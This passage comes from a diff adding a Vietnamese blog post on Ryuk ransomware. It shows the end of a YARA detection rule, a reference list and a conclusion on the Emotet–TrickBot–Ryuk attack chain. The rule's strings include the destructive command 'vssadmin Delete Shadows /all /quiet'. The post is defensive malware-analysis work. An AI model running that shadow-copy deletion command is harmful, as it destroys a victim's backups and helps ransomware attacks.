+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s2</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>No system is safe<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s3</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>svchos<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide fullword</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s4</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>vssadmin Delete Shadows /all /quiet<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s5</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>UNIQUE_ID_DO_NOT_REMOVE<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s7</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span><span class="z-constant z-character z-escape z-shell">\\</span>users<span class="z-constant z-character z-escape z-shell">\\</span>Public<span class="z-constant z-character z-escape z-shell">\\</span>window.bat<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide</span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell"><span class="z-meta z-group z-expansion z-parameter z-shell"><span class="z-punctuation z-definition z-variable z-shell">$</span><span class="z-variable z-other z-readwrite z-shell">s6</span></span></span></span><span class="z-meta z-function-call z-arguments z-shell"> = <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>HERMES<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span> ascii wide</span>
+</span><span class="z-source z-shell z-bash">    <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">condition:</span></span>
+</span><span class="z-source z-shell z-bash">        <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">5</span></span><span class="z-meta z-function-call z-arguments z-shell"> of them</span>
+</span><span class="z-source z-shell z-bash"><span class="z-punctuation z-definition z-compound z-braces z-end z-shell">}</span>
+</span></code></pre>
+<blockquote>
+<p>Yara rule này mình lấy từ N1ghtW0lf nhé</p>
+</blockquote>
+<h2 id="resources-tham-khao">Resources tham khảo<a class="zola-anchor" href="#resources-tham-khao" aria-label="Anchor link for: resources-tham-khao" style="visibility: hidden;"></a></h2>
+<ul>
+<li><a rel="nofollow noreferrer" href="https://blog.malwarebytes.com/threat-spotlight/2019/12/threat-spotlight-the-curious-case-of-ryuk-ransomware/">Malwarebytes - Threat Spotlight: The Curious Case of Ryuk Ransomware</a></li>
+<li><a rel="nofollow noreferrer" href="https://research.checkpoint.com/2018/ryuk-ransomware-targeted-campaign-break/">Check Point Research - Ryuk Ransomware Targeted Campaign Break</a></li>
+<li><a rel="nofollow noreferrer" href="https://n1ght-w0lf.github.io/malware%20analysis/ryuk-ransomware/">Deep Analysis of Ryuk Ransomware - n1ghtw0lf</a></li>
+<li><a rel="nofollow noreferrer" href="https://app.any.run/tasks/81eaa3cf-eb75-411f-adba-b09472927155/">ANY.RUN - Ryuk Sample Analysis</a></li>
+<li><a rel="nofollow noreferrer" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4672">Microsoft Docs - Event 4672</a></li>
+<li><a rel="nofollow noreferrer" href="https://www.codeproject.com/Articles/1658/Obtain-the-plain-text-session-key-using-CryptoAPI">CodeProject - Obtain the plain text session key using CryptoAPI</a></li>
+</ul>
+<h2 id="ket-luan">Kết luận<a class="zola-anchor" href="#ket-luan" aria-label="Anchor link for: ket-luan" style="visibility: hidden;"></a></h2>
+<p>Ryuk không chỉ là một ransomware đơn thuần mà là một "tác phẩm nghệ thuật" của tội phạm mạng - được thiết kế tỉ mỉ, thực thi chính xác và có hiệu quả tàn phá khủng khiếp. Sự phối hợp giữa Emotet, TrickBot và Ryuk tạo nên một chuỗi tấn công hoàn chỉnh có thể làm tê liệt toàn bộ hạ tầng IT của một tổ chức.</p>
+<p>Từ việc sử dụng dropper để "giao hàng" một cách tinh vi, đến kỹ thuật process injection để "ẩn mình", từ việc kill hàng loạt service bảo mật và backup đến việc mã hóa với tốc độ chớp nhoáng bằng multi-threading - tất cả đều cho thấy sự chuyên nghiệp đáng sợ của nhóm tội phạm đứng sau Ryuk.</p>
+<p>Việc hiểu rõ cách thức hoạt động của Ryuk không chỉ giúp các chuyên gia bảo mật phát triển các biện pháp phòng thủ hiệu quả mà còn nhắc nhở chúng ta rằng trong cuộc chiến an ninh mạng, kẻ tấn công luôn không ngừng tiến hóa và chúng ta cũng phải làm như vậy.</p>
+<p>Đặc biệt, việc Ryuk sử dụng keyword "HERMES" trong metadata - có thể là một tham chiếu đến Hermes Ransomware trước đó - cho thấy sự liên kết và phát triển liên tục trong thế giới malware. Điều này cũng nhấn mạnh tầm quan trọng của việc backup thường xuyên, phân quyền hợp lý, và giám sát liên tục các hoạt động bất thường trong hệ thống.</p>
+<hr />
+
+      </article>
+
+      
+      
+
+      
+      
+    </div>
+
+    
+
+
+<footer>
+  <div class="left">
+    <div class="copyright">
+      © 2025 <a href="https:&#x2F;&#x2F;wen.is-a.dev">Wen</a>
+      
+    </div>
+  </div>
+
+  <div class="right">
+    
+    
+    
+    
+
+    <!-- 
+    
+    
+    <button id="theme-toggle" aria-label="theme switch">
+      <span class="moon-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M10 7C10 10.866 13.134 14 17 14C18.9584 14 20.729 13.1957 21.9995 11.8995C22 11.933 22 11.9665 22 12C22 17.5228 17.5228 22 12 22C6.47715 22 2 17.5228 2 12C2 6.47715 6.47715 2 12 2C12.0335 2 12.067 2 12.1005 2.00049C10.8043 3.27098 10 5.04157 10 7ZM4 12C4 16.4183 7.58172 20 12 20C15.0583 20 17.7158 18.2839 19.062 15.7621C18.3945 15.9187 17.7035 16 17 16C12.0294 16 8 11.9706 8 7C8 6.29648 8.08133 5.60547 8.2379 4.938C5.71611 6.28423 4 8.9417 4 12Z" fill="currentColor"></path></svg>
+</span>
+      <span class="sun-icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="18" height="18"><path d="M12 18C8.68629 18 6 15.3137 6 12C6 8.68629 8.68629 6 12 6C15.3137 6 18 8.68629 18 12C18 15.3137 15.3137 18 12 18ZM12 16C14.2091 16 16 14.2091 16 12C16 9.79086 14.2091 8 12 8C9.79086 8 8 9.79086 8 12C8 14.2091 9.79086 16 12 16ZM11 1H13V4H11V1ZM11 20H13V23H11V20ZM3.51472 4.92893L4.92893 3.51472L7.05025 5.63604L5.63604 7.05025L3.51472 4.92893ZM16.9497 18.364L18.364 16.9497L20.4853 19.0711L19.0711 20.4853L16.9497 18.364ZM19.0711 3.51472L20.4853 4.92893L18.364 7.05025L16.9497 5.63604L19.0711 3.51472ZM5.63604 16.9497L7.05025 18.364L4.92893 20.4853L3.51472 19.0711L5.63604 16.9497ZM23 11V13H20V11H23ZM4 11V13H1V11H4Z" fill="currentColor"></path></svg>
+</span>
+    </button>
+     -->
+  </div>
+</footer>
+
+
+
+
+  </main>
+</div>
+
+  
+<script src="/js/lightense.min.js"></script>
+
+
+
+  <script src="https://wen.is-a.dev/js/main.js"></script>
+</body>
+
+</html>
